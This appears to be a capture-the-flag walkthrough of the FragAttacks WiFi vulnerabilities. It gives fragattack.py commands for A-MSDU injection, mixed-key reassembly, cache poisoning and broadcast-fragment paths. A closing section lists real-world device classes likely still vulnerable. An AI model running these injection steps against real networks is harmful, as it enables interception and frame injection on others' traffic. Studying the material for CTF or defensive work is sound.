# FragAttacks — walkthrough

Twelve CVEs. Two headline paths — A-MSDU flag confusion (plaintext-
inject) and mixed-key fragment reassembly. Both require MC-MitM plus
crafted-frame injection. Vanhoef's PoC repo drives most of the
mechanics.

## Preconditions

- Target with unpatched WiFi stack (see `recognition.md`).
- MC-MitM setup (see `mc-mitm/walkthrough.md`).
- Scapy or Vanhoef's `fragattack.py` for crafted frame injection.

## Path A — A-MSDU flag confusion (CVE-2020-24588)

The idea: inject a plaintext frame the client parses as an A-MSDU
subframe destined for itself.

```
# 1. MC-MitM channel setup.
# 2. Bring the target into your rogue's ambit; ensure MitM is up.
# 3. Craft a plaintext A-MSDU frame with Is-Aggregate bit set,
#    destined for the client, containing an inner frame you control.

git clone https://github.com/vanhoefm/fragattacks
cd fragattacks
sudo ./fragattack.py wlan1mon amsdu-inject
```

Vanhoef's script prompts for the target MAC + AP MAC and orchestrates
the injection. On a vulnerable client, the injected inner frame is
delivered to the local IP stack as if it came from the AP.

## Path B — Mixed-key fragment cache (CVE-2020-24587)

The trick: send fragment #1 encrypted with the old (pre-rekey) key
and fragment #2 with the new key. Some receivers reassemble across
the rekey.

```
# 1. Force a rekey (patient — wait for the GTK/PTK rekey interval).
# 2. Immediately after, send fragment #1 encrypted with the old key
#    but a modified fragment #2 payload from the attacker.
sudo ./fragattack.py wlan1mon mixed-key-attack
```

## Path C — Fragment cache poisoning at (re)connect (CVE-2020-24586)

Some stacks don't clear the fragment cache on disconnect. Fill the
cache with attacker-controlled fragments before the victim
reconnects; the reconnect flushes it into the packet stream.

```
sudo ./fragattack.py wlan1mon cache-poison
```

## Path D — Broadcast fragment plaintext acceptance

Some clients accept plaintext broadcast fragments inside an
encrypted BSS. Vanhoef's script includes an option to test this
per-target.

```
sudo ./fragattack.py wlan1mon ping-broadcast-frag
```

## Reading the results

Vanhoef's script includes a companion `test-tool` that pings the
target with an ICMP echo whose payload lands only if the primitive
succeeded. Successful reception = vulnerable.

For WCTF, the flag surface is usually:

- **Plaintext-inject** delivering a crafted DNS query the puzzle
  scoring bot answers with the flag.
- **Mixed-key reassembly** yielding a decrypt-then-print of a
  target frame.
- **Cache poison** landing a pre-crafted flag-carrying frame in the
  victim's IP stack.

## Failure modes

- **Target is patched.** All FragAttacks CVEs have vendor patches
  since 2021. Fingerprint the target OS first.
- **MC-MitM not clean.** If the victim's driver flips channels or
  the rogue-side clone loses track, the frame timing gets off and
  the injection window closes.
- **Client-driver's fragmentation cache implemented correctly.** The
  paper enumerates which combinations are exploitable; not every
  patched CVE is the *only* one on a given stack.
- **PMF-required + all fragments encrypted.** Path A closes; Path B
  still applies if a rekey happens.

## 2026-target expectations

- Thin WiFi front-ends (ESP32 pre-firmware-4, Realtek microcontroller
  units) — some vulnerable stacks linger.
- Old embedded APs (industrial gear from 2015–2018).
- End-of-life client devices.

## Cite

- Vanhoef 2020 — Fragment and Forge (USENIX Security 2021).
- vanhoefm/fragattacks GitHub — PoC scripts.
- Design CVEs: CVE-2020-24586, 24587, 24588. Implementation CVEs:
  CVE-2020-26139, 26140, 26141, 26142, 26143, 26144, 26145, 26146,
  26147. 12 total.
- attacks.json: `fragattacks-plaintext-inject`,
  `fragattacks-mixed-key`, `fragattacks-cache-poisoning`.
